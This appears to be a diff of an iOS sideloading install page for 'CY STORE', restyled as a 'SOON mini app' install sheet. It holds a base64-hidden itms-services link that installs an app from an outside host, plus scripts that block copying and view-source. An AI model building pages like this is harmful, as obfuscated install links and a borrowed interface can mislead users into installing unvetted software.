@@ -3,103 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CY STORE - تثبيت التطبيق</title>
+    <title>SOON mini app</title>
     <style>
         * {
             -webkit-touch-callout: none;
             -webkit-user-select: none;
-            -khtml-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
             user-select: none;
+            -webkit-tap-highlight-color: transparent;
         }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #050a0f; 
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
+            background-color: #000000; 
             color: #ffffff; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
             margin: 0;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
             overflow: hidden;
         }
-        .container { 
-            background: linear-gradient(145deg, #0d1b2a, #1b263b);
-            padding: 50px 30px; 
-            border-radius: 30px; 
-            text-align: center; 
-            box-shadow: 0 20px 50px rgba(0,0,0,0.8); 
-            width: 85%; 
-            max-width: 420px;
-            border: 1px solid rgba(0, 255, 255, 0.1);
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            font-size: 17px;
         }
-        .app-img {
+        .header .close { color: #007aff; cursor: pointer; }
+        .header .title { text-align: center; }
+        .header .title div:first-child { font-weight: bold; font-size: 16px; }
+        .header .title div:last-child { font-size: 12px; color: #8e8e93; }
+        .header .more { font-size: 20px; }
+
+        .content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-bottom: 100px;
+        }
+        .app-icon {
             width: 120px;
             height: 120px;
-            border-radius: 28px;
-            margin-bottom: 25px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            border-radius: 25px;
+            box-shadow: 0 0 30px rgba(255,255,255,0.1);
             object-fit: cover;
         }
-        h1 { 
-            font-size: 26px; 
-            margin-bottom: 12px; 
-            color: #e0e1dd; 
-            font-weight: 800; 
-            letter-spacing: 1px;
+
+        .bottom-bar {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background-color: #0f1721;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            box-sizing: border-box;
+            padding-bottom: 30px;
         }
-        p { 
-            font-size: 16px; 
-            color: #a2a2a2; 
-            margin-bottom: 40px; 
-            line-height: 1.7; 
+        .btn-cancel {
+            color: #8e8e93;
+            font-size: 18px;
+            font-weight: 500;
+            text-decoration: none;
+            padding: 10px 20px;
         }
-        .btn { 
-            display: inline-block; 
-            background: linear-gradient(135deg, #0077b6, #00b4d8); 
-            color: #ffffff; 
-            text-decoration: none; 
-            padding: 18px; 
-            border-radius: 18px; 
-            font-size: 18px; 
-            font-weight: 700; 
-            width: 100%; 
-            box-sizing: border-box; 
-            transition: transform 0.2s, box-shadow 0.2s;
-            box-shadow: 0 8px 20px rgba(0, 180, 216, 0.3);
-            cursor: pointer;
-        }
-        .btn:active {
-            transform: scale(0.97);
-        }
-        .footer {
-            margin-top: 30px;
-            font-size: 12px;
-            color: #415a77;
+        .btn-install {
+            background-color: #f7c600;
+            color: #000000;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 12px 60px;
+            border-radius: 12px;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(247, 198, 0, 0.2);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://raw.githubusercontent.com/ipa-black/cy-store/refs/heads/main/1CE2CB8F-CB03-4E4E-9C58-AED43F2DBE4C.jpeg" alt="CY STORE" class="app-img">
-        <h1>CY STORE</h1>
-        <p>أهلاً بك في متجر CY STORE. اضغط على الزر أدناه لتثبيت التطبيق مباشرة على جهازك.</p>
-        <a id="installBtn" class="btn">تثبيت التطبيق الآن 📥</a>
-        <div class="footer">© 2024 CY STORE - All Rights Reserved</div>
+    <div class="header">
+        <div class="close">Close</div>
+        <div class="title">
+            <div>SOON</div>
+            <div>mini app</div>
+        </div>
+        <div class="more">•••</div>
     </div>
+
+    <div class="content">
+        <img src="https://raw.githubusercontent.com/ipa-black/cy-store/refs/heads/main/1CE2CB8F-CB03-4E4E-9C58-AED43F2DBE4C.jpeg" class="app-icon">
+    </div>
+
+    <div class="bottom-bar">
+        <a href="#" class="btn-cancel">إلغاء</a>
+        <a id="installBtn" class="btn-install">تثبيت</a>
+    </div>
+
     <script>
-        // فك تشفير الرابط عند النقر (تشفير بسيط لمنع النسخ المباشر)
         const encoded = "aXRtcy1zZXJ2aWNlczovLz9hY3Rpb249ZG93bmxvYWQtbWFuaWZlc3QmdXJsPWh0dHBzOi8vY3ktc3RvcmUudmVyY2VsLmFwcC9pbnN0YWxsLnBsaXN0";
-        document.getElementById('installBtn').addEventListener('click', function() {
+        document.getElementById('installBtn').addEventListener('click', function(e) {
+            e.preventDefault();
             window.location.href = atob(encoded);
         });
 
-        // منع القائمة المنبثقة (Right Click)
+        // منع النسخ والتقريب
         document.addEventListener('contextmenu', event => event.preventDefault());
-        
-        // منع اختصارات لوحة المفاتيح للنسخ والتقريب
         document.addEventListener('keydown', function(e) {
             if (e.ctrlKey && (e.key === 'c' || e.key === 'u' || e.key === 's' || e.key === '=' || e.key === '-')) {
                 e.preventDefault();
